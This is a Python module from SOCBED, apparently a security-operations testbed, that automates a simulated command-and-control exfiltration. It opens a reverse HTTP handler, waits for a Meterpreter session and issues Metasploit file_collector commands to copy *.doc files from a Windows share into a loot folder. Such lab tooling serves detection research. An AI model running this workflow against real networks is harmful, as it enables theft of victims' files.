# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import Attack, AttackInfo, AttackOptions
from attacks.reverseconnectionhandler import ReverseConnectionHandler


class C2ExfiltrationAttackOptions(AttackOptions):
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"
    path = "File search path"
    pattern = "File search pattern"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "80"
        self.path = "\\\\\\\\172.16.1.2\\\\C$\\\\BREACH"  # Metasploit requires escaped backslashes
        self.pattern = "*.doc"


class C2ExfiltrationAttack(Attack):
    info = AttackInfo(
        name="c2_exfiltration",
        description="Finds and sends files over the C&C channel")
    options_class = C2ExfiltrationAttackOptions
    handler = None

    def run(self):
        self._cleanup_old_results()
        with self.check_printed("Downloading to /root/loot"):
            with self.wrap_ssh_exceptions():
                self._start_handler()
                self._handle_output()

    def _cleanup_old_results(self):
        self.exec_command_on_target("cd /root; mkdir -p loot; cd loot; rm -f files.txt")

    def _start_handler(self):
        self.handler = ReverseConnectionHandler(self.ssh_client, self.options.lhost, self.options.lport)
        self.handler.start()

    def _handle_output(self):
        for line in self.handler.stdout:
            self._respond(line)
            self.print(line)

    def _respond(self, line):
        if "Meterpreter session 1 opened" in line:
            time.sleep(2)
            self._collect_files()
        elif ("Backgrounding session " in line) or \
                ("Exploit completed, but no session was created" in line):
            self.handler.shutdown()

    def _collect_files(self):
        path = self.options.path
        pattern = self.options.pattern
        self.ssh_client.write_lines(self.handler.stdin, [
            f"run file_collector -r -d {path} -f {pattern} -o /root/loot/files.txt",
            "run file_collector -i /root/loot/files.txt -l /root/loot",
            "background"])
